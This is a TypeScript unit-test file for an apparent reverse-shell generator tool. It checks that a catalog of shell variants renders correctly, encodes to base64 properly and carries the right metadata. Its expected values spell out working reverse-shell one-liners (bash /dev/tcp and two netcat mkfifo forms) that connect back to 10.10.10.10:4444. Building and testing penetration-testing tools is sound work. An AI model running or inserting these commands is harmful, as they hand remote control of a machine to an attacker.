import { describe, expect, it } from "vitest";
import { base64ToBytes, decodeBytesWithCharset } from "../encoding/bytes";
import { ShellParams } from "./params";
import { SHELLS, SHELLS_BY_ID } from "./shells";

const PARAMS: ShellParams = { ip: "10.10.10.10", port: 4444, shellPath: "/bin/bash" };

describe("SHELLS catalog", () => {
  it("every variant renders a non-empty one-liner containing the IP and port (unless flagged opaque, e.g. base64 stagers)", () => {
    for (const shell of SHELLS) {
      const rendered = shell.render(PARAMS);
      expect(rendered.length).toBeGreaterThan(0);
      const opaque = shell.opaqueParams ?? [];
      if (!opaque.includes("ip")) expect(rendered).toContain(PARAMS.ip);
      if (!opaque.includes("port")) expect(rendered).toContain(String(PARAMS.port));
    }
  });

  it("every renderEncoded variant produces a different string than render", () => {
    for (const shell of SHELLS) {
      if (!shell.renderEncoded) continue;
      const encoded = shell.renderEncoded(PARAMS);
      expect(encoded.length).toBeGreaterThan(0);
      expect(encoded).not.toBe(shell.render(PARAMS));
    }
  });

  it("every renderEncoded variant's base64 blob decodes (UTF-16LE) to exactly the script embedded in its plain render() form, and still targets the port", () => {
    for (const shell of SHELLS) {
      if (!shell.renderEncoded) continue;
      const encoded = shell.renderEncoded(PARAMS);
      const blob = encoded.trim().split(/\s+/).pop()!;
      const decoded = decodeBytesWithCharset(base64ToBytes(blob), "utf-16le");
      expect(shell.render(PARAMS)).toContain(decoded);
      expect(decoded).toContain(PARAMS.ip);
      expect(decoded).toContain(String(PARAMS.port));
    }
  });

  it("every id in SHELLS_BY_ID is unique and matches its entry", () => {
    const ids = SHELLS.map((s) => s.id);
    expect(new Set(ids).size).toBe(ids.length);
    for (const shell of SHELLS) {
      expect(SHELLS_BY_ID[shell.id]).toBe(shell);
    }
  });

  it("every entry declares a file extension and default MIME type", () => {
    for (const shell of SHELLS) {
      expect(shell.file.extension.length).toBeGreaterThan(0);
      expect(shell.file.defaultMime.length).toBeGreaterThan(0);
    }
  });

  it("includes at least one variant for each of the build-order-mandated languages", () => {
    const groups = new Set(SHELLS.map((s) => s.group));
    for (const required of ["Bash", "Netcat", "Python", "PHP", "PowerShell"]) {
      expect(groups.has(required)).toBe(true);
    }
  });

  it("renders the exact verified bash /dev/tcp one-liner", () => {
    expect(SHELLS_BY_ID["bash-dev-tcp"].render(PARAMS)).toBe("/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1");
  });

  it("renders the exact verified nc mkfifo one-liner (Linux)", () => {
    expect(SHELLS_BY_ID["nc-mkfifo-linux"].render(PARAMS)).toBe(
      "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.10.10 4444 >/tmp/f",
    );
  });

  it("renders the exact verified nc mkfifo one-liner (Mac, BSD nc ordering)", () => {
    expect(SHELLS_BY_ID["nc-mkfifo-mac"].render(PARAMS)).toBe(
      "mkfifo /tmp/f;/bin/bash -i < /tmp/f 2>&1|nc 10.10.10.10 4444 > /tmp/f;rm /tmp/f",
    );
  });

  it("flags awk as gawk-only in its label/note", () => {
    const awk = SHELLS_BY_ID["awk"];
    expect(awk.label.toLowerCase()).toContain("gawk");
  });

  it("flags nc-e as traditional/GNU-only, not OpenBSD-compatible", () => {
    expect(SHELLS_BY_ID["nc-e"].note).toMatch(/OpenBSD/);
  });
});
